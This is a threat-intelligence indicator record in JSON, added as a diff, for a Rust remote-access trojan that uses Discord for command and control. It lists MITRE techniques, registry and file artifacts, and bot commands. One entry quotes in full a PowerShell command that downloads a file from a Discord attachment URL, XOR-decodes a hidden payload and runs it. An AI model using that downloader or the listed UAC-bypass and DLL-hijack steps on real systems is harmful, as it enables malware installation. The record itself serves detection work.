@@ -1,0 +1,263 @@
+{
+  "malware_family": "CikaBika Bot",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "CikaBika Bot is a Rust-based RAT distributed via a document-themed lure in a disk image. A Nim loader uses a UAC bypass and DLL search-order hijacking against Microsoft Edge to deploy the payload. The RAT uses Discord for command and control, supporting reconnaissance, remote command execution, and file transfers.",
+  "mitre_techniques": [
+    "T1204.002",
+    "T1036.007",
+    "T1059.001",
+    "T1027",
+    "T1140",
+    "T1548.002",
+    "T1112",
+    "T1574.001",
+    "T1036.005",
+    "T1082",
+    "T1016",
+    "T1057",
+    "T1113",
+    "T1059.003",
+    "T1102.002",
+    "T1560.001",
+    "T1567",
+    "T1070.004",
+    "T1218.010",
+    "T1005",
+    "T1074.001",
+    "T1041",
+    "T1564.003",
+    "T1027.013"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "powershell.exe -w hidden -c \"(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1149429782547144724/1149429824633843712/Presentation_Generale.pdf?ex=654a6915&is=6537f415&hm=08b049d52f6b5b5c7784f18392135639f75a953e1a0b5a6c0b39f37c7689d02c&', ($env:temp + '\\' + 'Presentation_Generale.pdf'));[System.Diagnostics.Process]::Start(($env:temp + '\\' + 'Presentation_Generale.pdf')) ; $var = get-content -path ($env:temp + '\\' + 'Presentation_Generale.pdf') -Encoding byte -readcount 0; [System.IO.File]::WriteAllBytes(($env:temp + '\\' + 'IfyuUapz.txt'),($var[239..($var.length - 1)] | %{ $_ -bxor $var[32] })) ; cmd /c ($env:temp + '\\' + 'IfyuUapz.txt');\"",
+      "context": "Executed by Proposition_Projet_Personnalisable.docx.lnk to decode and run payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "Modified to trigger command for UAC bypass via computerdefaults.exe.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "Destination for malicious DLL for search order hijacking.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "Path where the Nim loader is decoded from the PDF.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "Staging location for malicious DLL before UAC bypass.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet_Personnalisable.docx.lnk",
+      "context": "LNK file disguised as a Word document in disk image.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Presentation_Generale.pdf.pdf",
+      "context": "Decoy PDF containing the XOR-encoded payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Proposition_Projet.img",
+      "context": "Disk image containing the initial lure files.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dbghelp.dll",
+      "context": "Malicious Rust RAT payload masquerading as a legitimate Edge dependency.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CikaBika-Bot",
+      "context": "Hardcoded string in the RAT's Discord configuration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!shell",
+      "context": "Discord command for remote command execution.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!sysinfo",
+      "context": "Discord command to get host details.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!isOn",
+      "context": "Discord command for device status check.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!src",
+      "context": "Discord command handler for screenshots.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "!camera",
+      "context": "Discord command handler for camera access.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "tasklist_startup.txt",
+      "context": "Output file from initial process enumeration.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "network_info.txt",
+      "context": "Output file from initial network configuration discovery.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "screenshot.png",
+      "context": "Output file from initial screenshot capture.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /c %TEMP%\\IfyuUapz.txt",
+      "context": "PowerShell executes the decoded Nim loader.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "powershell.exe>cmd.exe",
+      "context": "PowerShell executes the decoded Nim loader via cmd.exe.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "regsvr32.exe",
+      "context": "Used as a fallback mechanism to load the malicious DLL.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "Used to retrieve the victim's public IP address during registration.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script",
+    "document",
+    "archive"
+  ]
+}
